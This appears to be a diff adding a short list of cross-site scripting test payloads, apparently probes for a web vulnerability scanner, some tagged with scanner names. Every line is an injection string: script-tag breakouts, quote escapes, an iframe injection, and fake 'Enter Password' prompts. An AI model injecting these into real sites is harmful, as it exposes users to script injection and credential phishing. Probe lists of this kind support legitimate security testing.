@@ -1,0 +1,11 @@
+<script>alert(document.cookie);</script>
+'"--></style></scRipt><scRipt>alert(0x0008DF)</scRipt>
+'"><script>alert(123)</script><a href="http://demo.testfire.net">Click Here</a>
+';+alert('XSS_BY_Indusface');+//
+'"--></style></scRipt><scRipt>netsparker(0x000004)</scRipt>
+<script>javascript:prompt('XSS');</script>
+"><iframe src=http://demo.testfire.net></iframe>
+'"><script>prompt('Enter Password')</script><a href="http://demo.testfire.net">Click Here</a>
+
+'"--></style></scRipt><scRipt>alert('Enter Password')</scRipt>
+'"--></style></scRipt><scRipt>alert('456e7465722050617373776f7264')</scRipt>
